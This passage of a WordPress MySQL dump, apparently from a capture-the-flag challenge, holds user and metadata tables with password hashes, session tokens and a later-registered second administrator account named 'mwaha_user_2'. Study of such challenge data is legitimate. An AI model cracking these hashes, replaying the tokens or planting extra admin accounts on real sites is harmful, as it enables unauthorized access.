(6, 6, 'bp-email-type', 'A member has replied to an activity update that the recipient posted.', 0, 1),
(7, 7, 'bp-email-type', 'A member has replied to a comment on an activity update that the recipient posted.', 0, 1),
(8, 8, 'bp-email-type', 'Recipient was mentioned in an activity update.', 0, 1),
(9, 9, 'bp-email-type', 'Recipient was mentioned in a group activity update.', 0, 1),
(10, 10, 'bp-email-type', 'Recipient has registered for an account.', 0, 1),
(11, 11, 'bp-email-type', 'A member has sent a friend request to the recipient.', 0, 1),
(12, 12, 'bp-email-type', 'Recipient has had a friend request accepted by a member.', 0, 1),
(13, 13, 'bp-email-type', 'A group\'s details were updated.', 0, 1),
(14, 14, 'bp-email-type', 'A member has sent a group invitation to the recipient.', 0, 1),
(15, 15, 'bp-email-type', 'Recipient\'s status within a group has changed.', 0, 1),
(16, 16, 'bp-email-type', 'A member has requested permission to join a group.', 0, 1),
(17, 17, 'bp-email-type', 'Recipient has received a private message.', 0, 1),
(18, 18, 'bp-email-type', 'Recipient has changed their email address.', 0, 1),
(19, 19, 'bp-email-type', 'Recipient had requested to join a group, which was accepted.', 0, 1),
(20, 20, 'bp-email-type', 'Recipient had requested to join a group, which was rejected.', 0, 1),
(21, 21, 'bp-email-type', 'A site member has sent a site invitation to the recipient.', 0, 1),
(22, 22, 'bp-email-type', 'Someone has requested membership on this site.', 0, 1),
(23, 23, 'bp-email-type', 'A site membership request has been rejected.', 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `wp_usermeta`
--

CREATE TABLE `wp_usermeta` (
  `umeta_id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_usermeta`
--

INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES
(1, 1, 'nickname', 'adminlol'),
(2, 1, 'first_name', ''),
(3, 1, 'last_name', ''),
(4, 1, 'description', ''),
(5, 1, 'rich_editing', 'true'),
(6, 1, 'syntax_highlighting', 'true'),
(7, 1, 'comment_shortcuts', 'false'),
(8, 1, 'admin_color', 'fresh'),
(9, 1, 'use_ssl', '0'),
(10, 1, 'show_admin_bar_front', 'true'),
(11, 1, 'locale', ''),
(12, 1, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'),
(13, 1, 'wp_user_level', '10'),
(14, 1, 'dismissed_wp_pointers', 'plugin_editor_notice,theme_editor_notice'),
(15, 1, 'show_welcome_panel', '1'),
(16, 1, 'session_tokens', 'a:3:{s:64:\"d508695d6af2710a75ab6b9e246b22f103bbef1f3ddda0343a9b46dec50f3afd\";a:4:{s:10:\"expiration\";i:1667140908;s:2:\"ip\";s:10:\"172.23.0.1\";s:2:\"ua\";s:111:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\";s:5:\"login\";i:1666968108;}s:64:\"23bd0064510d785b9ba51227493828f1e56b6502b1c29e3a0c7de05a6e8c7fbc\";a:4:{s:10:\"expiration\";i:1667141305;s:2:\"ip\";s:10:\"172.23.0.1\";s:2:\"ua\";s:111:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\";s:5:\"login\";i:1666968505;}s:64:\"3fffd8779aec3db4a72dce9d3f468bb8044062921df0e5f46f82a1bfbd2df0a6\";a:4:{s:10:\"expiration\";i:1667222845;s:2:\"ip\";s:10:\"172.24.0.1\";s:2:\"ua\";s:111:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\";s:5:\"login\";i:1667050045;}}'),
(17, 1, 'wp_dashboard_quick_press_last_post_id', '4'),
(18, 1, 'community-events-location', 'a:1:{s:2:\"ip\";s:10:\"172.24.0.0\";}'),
(20, 1, '_yoast_alerts_dismissed', 'a:1:{s:26:\"webinar-promo-notification\";b:1;}'),
(21, 2, 'nickname', 'user1'),
(22, 2, 'first_name', ''),
(23, 2, 'last_name', ''),
(24, 2, 'description', ''),
(25, 2, 'rich_editing', 'true'),
(26, 2, 'syntax_highlighting', 'true'),
(27, 2, 'comment_shortcuts', 'false'),
(28, 2, 'admin_color', 'fresh'),
(29, 2, 'use_ssl', '0'),
(30, 2, 'show_admin_bar_front', 'true'),
(31, 2, 'locale', ''),
(32, 2, 'wp_capabilities', 'a:1:{s:10:\"subscriber\";b:1;}'),
(33, 2, 'wp_user_level', '0'),
(34, 2, '_yoast_wpseo_profile_updated', '1666514469'),
(35, 2, 'default_password_nag', ''),
(36, 1, 'managenav-menuscolumnshidden', 'a:5:{i:0;s:11:\"link-target\";i:1;s:11:\"css-classes\";i:2;s:3:\"xfn\";i:3;s:11:\"description\";i:4;s:15:\"title-attribute\";}'),
(37, 1, 'metaboxhidden_nav-menus', 'a:2:{i:0;s:12:\"add-post_tag\";i:1;s:15:\"add-post_format\";}'),
(38, 1, 'wp_yoast_notifications', 'a:1:{i:0;a:2:{s:7:\"message\";s:279:\"<p>Because of a change in your home URL setting, some of your SEO data needs to be reprocessed.</p><p>We estimate this will take less than a minute.</p><a class=\"button\" href=\"http://exp-2-2/wp-admin/admin.php?page=wpseo_tools&start-indexation=true\">Start SEO data optimization</a>\";s:7:\"options\";a:10:{s:4:\"type\";s:7:\"warning\";s:2:\"id\";s:13:\"wpseo-reindex\";s:4:\"user\";O:7:\"WP_User\":8:{s:4:\"data\";O:8:\"stdClass\":10:{s:2:\"ID\";s:1:\"1\";s:10:\"user_login\";s:8:\"adminlol\";s:9:\"user_pass\";s:34:\"$P$BG/B6XKnUcUvVIyqahfdy7pENcw2Xc0\";s:13:\"user_nicename\";s:8:\"adminlol\";s:10:\"user_email\";s:22:\"notreal@notreal.wac.tf\";s:8:\"user_url\";s:16:\"http://localhost\";s:15:\"user_registered\";s:19:\"2022-01-04 07:29:40\";s:19:\"user_activation_key\";s:0:\"\";s:11:\"user_status\";s:1:\"0\";s:12:\"display_name\";s:8:\"adminlol\";}s:2:\"ID\";i:1;s:4:\"caps\";a:1:{s:13:\"administrator\";b:1;}s:7:\"cap_key\";s:15:\"wp_capabilities\";s:5:\"roles\";a:1:{i:0;s:13:\"administrator\";}s:7:\"allcaps\";a:65:{s:13:\"switch_themes\";b:1;s:11:\"edit_themes\";b:1;s:16:\"activate_plugins\";b:1;s:12:\"edit_plugins\";b:1;s:10:\"edit_users\";b:1;s:10:\"edit_files\";b:1;s:14:\"manage_options\";b:1;s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:6:\"import\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:8:\"level_10\";b:1;s:7:\"level_9\";b:1;s:7:\"level_8\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:12:\"delete_users\";b:1;s:12:\"create_users\";b:1;s:17:\"unfiltered_upload\";b:1;s:14:\"edit_dashboard\";b:1;s:14:\"update_plugins\";b:1;s:14:\"delete_plugins\";b:1;s:15:\"install_plugins\";b:1;s:13:\"update_themes\";b:1;s:14:\"install_themes\";b:1;s:11:\"update_core\";b:1;s:10:\"list_users\";b:1;s:12:\"remove_users\";b:1;s:13:\"promote_users\";b:1;s:18:\"edit_theme_options\";b:1;s:13:\"delete_themes\";b:1;s:6:\"export\";b:1;s:20:\"wpseo_manage_options\";b:1;s:15:\"manage_security\";b:1;s:10:\"copy_posts\";b:1;s:13:\"administrator\";b:1;}s:6:\"filter\";N;s:16:\"\0WP_User\0site_id\";i:1;}s:5:\"nonce\";N;s:8:\"priority\";d:0.8;s:9:\"data_json\";a:0:{}s:13:\"dismissal_key\";N;s:12:\"capabilities\";s:20:\"wpseo_manage_options\";s:16:\"capability_check\";s:3:\"all\";s:14:\"yoast_branding\";b:0;}}}'),
(39, 1, 'wp_statistics', 'a:1:{s:13:\"dashboard_set\";s:6:\"13.1.5\";}'),
(40, 1, 'metaboxhidden_dashboard', 'a:13:{i:0;s:28:\"wp-statistics-summary-widget\";i:1;s:29:\"wp-statistics-browsers-widget\";i:2;s:30:\"wp-statistics-platforms-widget\";i:3;s:30:\"wp-statistics-countries-widget\";i:4;s:25:\"wp-statistics-hits-widget\";i:5;s:26:\"wp-statistics-pages-widget\";i:6;s:30:\"wp-statistics-referring-widget\";i:7;s:27:\"wp-statistics-search-widget\";i:8;s:26:\"wp-statistics-words-widget\";i:9;s:33:\"wp-statistics-top-visitors-widget\";i:10;s:27:\"wp-statistics-recent-widget\";i:11;s:28:\"wp-statistics-hitsmap-widget\";i:12;s:31:\"wp-statistics-useronline-widget\";}'),
(41, 1, 'eme_donate_notice_ignore', '20221023'),
(42, 1, 'eme_hello_notice_ignore', '20221023'),
(71, 1, 'wp_limit_login_nag_ignore', 'true'),
(72, 4, 'nickname', 'mwaha_user_2'),
(73, 4, 'first_name', 'Mufasa'),
(74, 4, 'last_name', ''),
(75, 4, 'description', ''),
(76, 4, 'rich_editing', 'true'),
(77, 4, 'syntax_highlighting', 'true'),
(78, 4, 'comment_shortcuts', 'false'),
(79, 4, 'admin_color', 'fresh'),
(80, 4, 'use_ssl', '0'),
(81, 4, 'show_admin_bar_front', 'true'),
(82, 4, 'locale', ''),
(83, 4, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'),
(84, 4, 'wp_user_level', '10'),
(85, 4, 'dismissed_wp_pointers', ''),
(87, 2, 'session_tokens', 'a:1:{s:64:\"d4869e1350dff62a98043bfc4c9e9e68d7fa96a7c3d15ff7142d8ba514c40c81\";a:4:{s:10:\"expiration\";i:1667223008;s:2:\"ip\";s:10:\"172.24.0.1\";s:2:\"ua\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36\";s:5:\"login\";i:1667050208;}}'),
(88, 2, 'community-events-location', 'a:1:{s:2:\"ip\";s:10:\"172.24.0.0\";}'),
(89, 2, 'wp_limit_login_nag_ignore', 'true');

-- --------------------------------------------------------

--
-- Table structure for table `wp_users`
--

CREATE TABLE `wp_users` (
  `ID` bigint(20) UNSIGNED NOT NULL,
  `user_login` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_pass` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_nicename` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_url` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_registered` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `user_activation_key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_status` int(11) NOT NULL DEFAULT 0,
  `display_name` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_users`
--

INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES
(1, 'adminlol', '$P$BZAmfTDV5cvZueYbDub/phm/yz/IpN0', 'adminlol', 'notreal@notreal.wac.tf', 'http://localhost', '2022-01-04 07:29:40', '', 0, 'adminlol'),
(2, 'user1', '$P$BjS3oso8YqinOk/oxu3ivDQI/yitgO.', 'user1', 'user1@notreal.wac.tf', '', '2022-10-23 08:41:09', '', 0, 'user1'),
(4, 'mwaha_user_2', '$P$BTy3tgGxBN.bduyW/RpMHC8HZAzjRz0', 'mwaha_user_2', 'notarealemail@wac.tf', '', '2022-10-28 14:51:29', '', 0, 'Mufasa');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_bouncevisits`
--

CREATE TABLE `wp_wsm_bouncevisits` (
  `visitId` bigint(10) UNSIGNED DEFAULT NULL,
  `visitLastActionTime` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_browsers`
--

CREATE TABLE `wp_wsm_browsers` (
  `id` tinyint(2) UNSIGNED NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_browsers`
--

INSERT INTO `wp_wsm_browsers` (`id`, `name`) VALUES
(1, 'Mozilla Firefox'),
(2, 'Google Chrome'),
(3, 'Opera'),
(4, 'Safari'),
(5, 'Internet Explorer'),
(6, 'Micorsoft Edge'),
(7, 'Torch'),
(8, 'Maxthon'),
(9, 'SeaMonkey'),
(10, 'Avant Browser'),
(11, 'Deepnet Explorer'),
(12, 'UE Browser');

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_countries`
--

CREATE TABLE `wp_wsm_countries` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin NOT NULL,
  `alpha2Code` varchar(2) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin NOT NULL,
  `alpha3Code` varchar(3) CHARACTER SET utf8mb3 COLLATE utf8mb3_bin NOT NULL,
  `numericCode` smallint(6) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_countries`
--

INSERT INTO `wp_wsm_countries` (`id`, `name`, `alpha2Code`, `alpha3Code`, `numericCode`) VALUES
(1, 'Afghanistan', 'AF', 'AFG', 4),
(2, '&Aring;land Islands', 'AX', 'ALA', 248),
(3, 'Albania', 'AL', 'ALB', 8),
(4, 'Algeria', 'DZ', 'DZA', 12),
(5, 'American Samoa', 'AS', 'ASM', 16),
(6, 'Andorra', 'AD', 'AND', 20),
(7, 'Angola', 'AO', 'AGO', 24),
(8, 'Anguilla', 'AI', 'AIA', 660),
(9, 'Antarctica', 'AQ', 'ATA', 10),
(10, 'Antigua and Barbuda', 'AG', 'ATG', 28),
(11, 'Argentina', 'AR', 'ARG', 32),
(12, 'Armenia', 'AM', 'ARM', 51),
(13, 'Aruba', 'AW', 'ABW', 533),
(14, 'Australia', 'AU', 'AUS', 36),
(15, 'Austria', 'AT', 'AUT', 40),
(16, 'Azerbaijan', 'AZ', 'AZE', 31),
(17, 'Bahamas', 'BS', 'BHS', 44),
(18, 'Bahrain', 'BH', 'BHR', 48),
(19, 'Bangladesh', 'BD', 'BGD', 50),
(20, 'Barbados', 'BB', 'BRB', 52),
(21, 'Belarus', 'BY', 'BLR', 112),
(22, 'Belgium', 'BE', 'BEL', 56),
(23, 'Belize', 'BZ', 'BLZ', 84),
(24, 'Benin', 'BJ', 'BEN', 204),
(25, 'Bermuda', 'BM', 'BMU', 60),
(26, 'Bhutan', 'BT', 'BTN', 64),
(27, 'Bolivia, Plurinational State of', 'BO', 'BOL', 68),
(28, 'Bonaire, Sint Eustatius and Saba', 'BQ', 'BES', 535),
(29, 'Bosnia and Herzegovina', 'BA', 'BIH', 70),
(30, 'Botswana', 'BW', 'BWA', 72),
(31, 'Bouvet Island', 'BV', 'BVT', 74),
(32, 'Brazil', 'BR', 'BRA', 76),
(33, 'British Indian Ocean Territory', 'IO', 'IOT', 86),
(34, 'Brunei Darussalam', 'BN', 'BRN', 96),
(35, 'Bulgaria', 'BG', 'BGR', 100),
(36, 'Burkina Faso', 'BF', 'BFA', 854),
(37, 'Burundi', 'BI', 'BDI', 108),
(38, 'Cambodia', 'KH', 'KHM', 116),
(39, 'Cameroon', 'CM', 'CMR', 120),
(40, 'Canada', 'CA', 'CAN', 124),
(41, 'Cape Verde', 'CV', 'CPV', 132),
(42, 'Cayman Islands', 'KY', 'CYM', 136),
(43, 'Central African Republic', 'CF', 'CAF', 140),
(44, 'Chad', 'TD', 'TCD', 148),
(45, 'Chile', 'CL', 'CHL', 152),
(46, 'China', 'CN', 'CHN', 156),
(47, 'Christmas Island', 'CX', 'CXR', 162),
(48, 'Cocos (Keeling) Islands', 'CC', 'CCK', 166),
(49, 'Colombia', 'CO', 'COL', 170),
(50, 'Comoros', 'KM', 'COM', 174),
(51, 'Congo', 'CG', 'COG', 178),
(52, 'Congo, the Democratic Republic of the', 'CD', 'COD', 180),
(53, 'Cook Islands', 'CK', 'COK', 184),
(54, 'Costa Rica', 'CR', 'CRI', 188),
(55, 'C&ocirc;te d\'\'Ivoire', 'CI', 'CIV', 384),
(56, 'Croatia', 'HR', 'HRV', 191),
(57, 'Cuba', 'CU', 'CUB', 192),
(58, 'Cura', 'CW', 'CUW', 531),
(59, 'Cyprus', 'CY', 'CYP', 196),
(60, 'Czech Republic', 'CZ', 'CZE', 203),
(61, 'Denmark', 'DK', 'DNK', 208),
(62, 'Djibouti', 'DJ', 'DJI', 262),
(63, 'Dominica', 'DM', 'DMA', 212),
(64, 'Dominican Republic', 'DO', 'DOM', 214),
(65, 'Ecuador', 'EC', 'ECU', 218),
(66, 'Egypt', 'EG', 'EGY', 818),
(67, 'El Salvador', 'SV', 'SLV', 222),
(68, 'Equatorial Guinea', 'GQ', 'GNQ', 226),
(69, 'Eritrea', 'ER', 'ERI', 232),
(70, 'Estonia', 'EE', 'EST', 233),
(71, 'Ethiopia', 'ET', 'ETH', 231),
(72, 'Falkland Islands (Malvinas)', 'FK', 'FLK', 238),
(73, 'Faroe Islands', 'FO', 'FRO', 234),
(74, 'Fiji', 'FJ', 'FJI', 242),
(75, 'Finland', 'FI', 'FIN', 246),
(76, 'France', 'FR', 'FRA', 250),
(77, 'French Guiana', 'GF', 'GUF', 254),
(78, 'French Polynesia', 'PF', 'PYF', 258),
(79, 'French Southern Territories', 'TF', 'ATF', 260),
(80, 'Gabon', 'GA', 'GAB', 266),
(81, 'Gambia', 'GM', 'GMB', 270),
(82, 'Georgia', 'GE', 'GEO', 268),
(83, 'Germany', 'DE', 'DEU', 276),
(84, 'Ghana', 'GH', 'GHA', 288),
(85, 'Gibraltar', 'GI', 'GIB', 292),
(86, 'Greece', 'GR', 'GRC', 300),
(87, 'Greenland', 'GL', 'GRL', 304),
(88, 'Grenada', 'GD', 'GRD', 308),
(89, 'Guadeloupe', 'GP', 'GLP', 312),
(90, 'Guam', 'GU', 'GUM', 316),
(91, 'Guatemala', 'GT', 'GTM', 320),
(92, 'Guernsey', 'GG', 'GGY', 831),
(93, 'Guinea', 'GN', 'GIN', 324),
(94, 'Guinea-Bissau', 'GW', 'GNB', 624),
(95, 'Guyana', 'GY', 'GUY', 328),
(96, 'Haiti', 'HT', 'HTI', 332),
(97, 'Heard Island and McDonald Islands', 'HM', 'HMD', 334),
(98, 'Holy See (Vatican City State)', 'VA', 'VAT', 336),
(99, 'Honduras', 'HN', 'HND', 340),
(100, 'Hong Kong', 'HK', 'HKG', 344),
(101, 'Hungary', 'HU', 'HUN', 348),
(102, 'Iceland', 'IS', 'ISL', 352),
(103, 'India', 'IN', 'IND', 356),
(104, 'Indonesia', 'ID', 'IDN', 360),
(105, 'Iran, Islamic Republic of', 'IR', 'IRN', 364),
(106, 'Iraq', 'IQ', 'IRQ', 368),
(107, 'Ireland', 'IE', 'IRL', 372),
(108, 'Isle of Man', 'IM', 'IMN', 833),
(109, 'Israel', 'IL', 'ISR', 376),
(110, 'Italy', 'IT', 'ITA', 380),
(111, 'Jamaica', 'JM', 'JAM', 388),
(112, 'Japan', 'JP', 'JPN', 392),
(113, 'Jersey', 'JE', 'JEY', 832),
(114, 'Jordan', 'JO', 'JOR', 400),
(115, 'Kazakhstan', 'KZ', 'KAZ', 398),
(116, 'Kenya', 'KE', 'KEN', 404),
(117, 'Kiribati', 'KI', 'KIR', 296),
(118, 'Korea, Democratic People\'s Republic of', 'KP', 'PRK', 408),
(119, 'Korea, Republic of', 'KR', 'KOR', 410),
(120, 'Kuwait', 'KW', 'KWT', 414),
(121, 'Kyrgyzstan', 'KG', 'KGZ', 417),
(122, 'Lao People\'s Democratic Republic', 'LA', 'LAO', 418),
(123, 'Latvia', 'LV', 'LVA', 428),
(124, 'Lebanon', 'LB', 'LBN', 422),
(125, 'Lesotho', 'LS', 'LSO', 426),
(126, 'Liberia', 'LR', 'LBR', 430),
(127, 'Libya', 'LY', 'LBY', 434),
(128, 'Liechtenstein', 'LI', 'LIE', 438),
(129, 'Lithuania', 'LT', 'LTU', 440),
(130, 'Luxembourg', 'LU', 'LUX', 442),
(131, 'Macao', 'MO', 'MAC', 446),
(132, 'Macedonia, the former Yugoslav Republic of', 'MK', 'MKD', 807),
(133, 'Madagascar', 'MG', 'MDG', 450),
(134, 'Malawi', 'MW', 'MWI', 454),
(135, 'Malaysia', 'MY', 'MYS', 458),
(136, 'Maldives', 'MV', 'MDV', 462),
(137, 'Mali', 'ML', 'MLI', 466),
(138, 'Malta', 'MT', 'MLT', 470),
(139, 'Marshall Islands', 'MH', 'MHL', 584),
(140, 'Martinique', 'MQ', 'MTQ', 474),
(141, 'Mauritania', 'MR', 'MRT', 478),
(142, 'Mauritius', 'MU', 'MUS', 480),
(143, 'Mayotte', 'YT', 'MYT', 175),
(144, 'Mexico', 'MX', 'MEX', 484),
(145, 'Micronesia, Federated States of', 'FM', 'FSM', 583),
(146, 'Moldova, Republic of', 'MD', 'MDA', 498),
(147, 'Monaco', 'MC', 'MCO', 492),
(148, 'Mongolia', 'MN', 'MNG', 496),
(149, 'Montenegro', 'ME', 'MNE', 499),
(150, 'Montserrat', 'MS', 'MSR', 500),
(151, 'Morocco', 'MA', 'MAR', 504),
(152, 'Mozambique', 'MZ', 'MOZ', 508),
(153, 'Myanmar', 'MM', 'MMR', 104),
(154, 'Namibia', 'NA', 'NAM', 516),
(155, 'Nauru', 'NR', 'NRU', 520),
(156, 'Nepal', 'NP', 'NPL', 524),
(157, 'Netherlands', 'NL', 'NLD', 528),
(158, 'New Caledonia', 'NC', 'NCL', 540),
(159, 'New Zealand', 'NZ', 'NZL', 554),
(160, 'Nicaragua', 'NI', 'NIC', 558),
(161, 'Niger', 'NE', 'NER', 562),
(162, 'Nigeria', 'NG', 'NGA', 566),
(163, 'Niue', 'NU', 'NIU', 570),
(164, 'Norfolk Island', 'NF', 'NFK', 574),
(165, 'Northern Mariana Islands', 'MP', 'MNP', 580),
(166, 'Norway', 'NO', 'NOR', 578),
(167, 'Oman', 'OM', 'OMN', 512),
(168, 'Pakistan', 'PK', 'PAK', 586),
(169, 'Palau', 'PW', 'PLW', 585),
(170, 'Palestine, State of', 'PS', 'PSE', 275),
(171, 'Panama', 'PA', 'PAN', 591),
(172, 'Papua New Guinea', 'PG', 'PNG', 598),
(173, 'Paraguay', 'PY', 'PRY', 600),
(174, 'Peru', 'PE', 'PER', 604),
(175, 'Philippines', 'PH', 'PHL', 608),
(176, 'Pitcairn', 'PN', 'PCN', 612),
(177, 'Poland', 'PL', 'POL', 616),
(178, 'Portugal', 'PT', 'PRT', 620),
(179, 'Puerto Rico', 'PR', 'PRI', 630),
(180, 'Qatar', 'QA', 'QAT', 634),
(181, 'R&eacute;union', 'RE', 'REU', 638),
(182, 'Romania', 'RO', 'ROU', 642),
(183, 'Russian Federation', 'RU', 'RUS', 643),
(184, 'Rwanda', 'RW', 'RWA', 646),
(185, 'Saint Barth&eacute;lemy', 'BL', 'BLM', 652),
(186, 'Saint Helena, Ascension and Tristan da Cunha', 'SH', 'SHN', 654),
(187, 'Saint Kitts and Nevis', 'KN', 'KNA', 659),
(188, 'Saint Lucia', 'LC', 'LCA', 662),
(189, 'Saint Martin (French part)', 'MF', 'MAF', 663),
(190, 'Saint Pierre and Miquelon', 'PM', 'SPM', 666),
(191, 'Saint Vincent and the Grenadines', 'VC', 'VCT', 670),
(192, 'Samoa', 'WS', 'WSM', 882),
(193, 'San Marino', 'SM', 'SMR', 674),
(194, 'Sao Tome and Principe', 'ST', 'STP', 678),
(195, 'Saudi Arabia', 'SA', 'SAU', 682),
(196, 'Senegal', 'SN', 'SEN', 686),
(197, 'Serbia', 'RS', 'SRB', 688),
(198, 'Seychelles', 'SC', 'SYC', 690),
(199, 'Sierra Leone', 'SL', 'SLE', 694),
(200, 'Singapore', 'SG', 'SGP', 702),
(201, 'Sint Maarten (Dutch part)', 'SX', 'SXM', 534),
(202, 'Slovakia', 'SK', 'SVK', 703),
(203, 'Slovenia', 'SI', 'SVN', 705),
(204, 'Solomon Islands', 'SB', 'SLB', 90),
(205, 'Somalia', 'SO', 'SOM', 706),
(206, 'South Africa', 'ZA', 'ZAF', 710),
(207, 'South Georgia and the South Sandwich Islands', 'GS', 'SGS', 239),
(208, 'South Sudan', 'SS', 'SSD', 728),
(209, 'Spain', 'ES', 'ESP', 724),
(210, 'Sri Lanka', 'LK', 'LKA', 144),
(211, 'Sudan', 'SD', 'SDN', 729),
(212, 'Suriname', 'SR', 'SUR', 740),
(213, 'Svalbard and Jan Mayen', 'SJ', 'SJM', 744),
(214, 'Swaziland', 'SZ', 'SWZ', 748),
(215, 'Sweden', 'SE', 'SWE', 752),
(216, 'Switzerland', 'CH', 'CHE', 756),
(217, 'Syrian Arab Republic', 'SY', 'SYR', 760),
(218, 'Taiwan, Province of China', 'TW', 'TWN', 158),
(219, 'Tajikistan', 'TJ', 'TJK', 762),
(220, 'Tanzania, United Republic of', 'TZ', 'TZA', 834),
(221, 'Thailand', 'TH', 'THA', 764),
(222, 'Timor-Leste', 'TL', 'TLS', 626),
(223, 'Togo', 'TG', 'TGO', 768),
(224, 'Tokelau', 'TK', 'TKL', 772),
(225, 'Tonga', 'TO', 'TON', 776),
(226, 'Trinidad and Tobago', 'TT', 'TTO', 780),
(227, 'Tunisia', 'TN', 'TUN', 788),
(228, 'Turkey', 'TR', 'TUR', 792),
(229, 'Turkmenistan', 'TM', 'TKM', 795),
(230, 'Turks and Caicos Islands', 'TC', 'TCA', 796),
(231, 'Tuvalu', 'TV', 'TUV', 798),
(232, 'Uganda', 'UG', 'UGA', 800),
(233, 'Ukraine', 'UA', 'UKR', 804),
(234, 'United Arab Emirates', 'AE', 'ARE', 784),
(235, 'United Kingdom', 'GB', 'GBR', 826),
(236, 'United States', 'US', 'USA', 840),
(237, 'United States Minor Outlying Islands', 'UM', 'UMI', 581),
(238, 'Uruguay', 'UY', 'URY', 858),
(239, 'Uzbekistan', 'UZ', 'UZB', 860),
(240, 'Vanuatu', 'VU', 'VUT', 548),
(241, 'Venezuela, Bolivarian Republic of', 'VE', 'VEN', 862),
(242, 'Viet Nam', 'VN', 'VNM', 704),
(243, 'Virgin Islands, British', 'VG', 'VGB', 92),
(244, 'Virgin Islands, U.S.', 'VI', 'VIR', 850),
(245, 'Wallis and Futuna', 'WF', 'WLF', 876),
(246, 'Western Sahara', 'EH', 'ESH', 732),
(247, 'Yemen', 'YE', 'YEM', 887),
(248, 'Zambia', 'ZM', 'ZMB', 894),
(249, 'Zimbabwe', 'ZW', 'ZWE', 716);

-- --------------------------------------------------------

--
-- Table structure for table `wp_wsm_dailyhourlyreport`
--

CREATE TABLE `wp_wsm_dailyhourlyreport` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL,
  `reportDate` datetime NOT NULL,
  `content` text NOT NULL,
  `timezone` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `wp_wsm_dailyhourlyreport`
--

INSERT INTO `wp_wsm_dailyhourlyreport` (`id`, `name`, `reportDate`, `content`, `timezone`) VALUES
(1, 'hourWisePageViews', '2022-10-23 00:00:00', 'a:5:{i:0;a:2:{s:4:\"hour\";s:2:\"14\";s:9:\"pageViews\";s:1:\"4\";}i:1;a:2:{s:4:\"hour\";s:2:\"15\";s:9:\"pageViews\";s:3:\"103\";}i:2;a:2:{s:4:\"hour\";s:2:\"16\";s:9:\"pageViews\";s:4:\"3137\";}i:3;a:2:{s:4:\"hour\";s:2:\"17\";s:9:\"pageViews\";s:4:\"1366\";}i:4;a:2:{s:4:\"hour\";s:2:\"18\";s:9:\"pageViews\";s:2:\"19\";}}', '+01:00'),
